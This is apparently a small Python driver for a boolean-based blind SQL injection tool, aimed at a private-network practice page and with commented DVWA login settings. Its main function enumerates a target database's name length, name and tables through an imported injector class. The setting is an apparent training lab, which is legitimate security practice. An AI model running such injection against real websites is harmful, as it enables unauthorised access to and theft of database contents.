from bool_injector import *

# 带有正常回显的url
url = "http://192.168.50.62/sqli/03.php?id=1"
show_payload = False

# for dvwa
# login_url = 'http://192.168.50.145/dvwa/login.php'
# username = 'admin'
# password = 'password'
# use_cookie = False
# cookie = {
#     'PHPSESSID': '2vnmjqn3ep6qghd128hh2ah0gc',
#     'security': 'low'
# } if use_cookie else {}


def main():
    sqli = BooleanInjector(url=url, use_cookie=False, show_payload=True)
    sqli.get_db_length()
    sqli.get_db_name()
    sqli.get_tables()


if __name__ == '__main__':
    main()
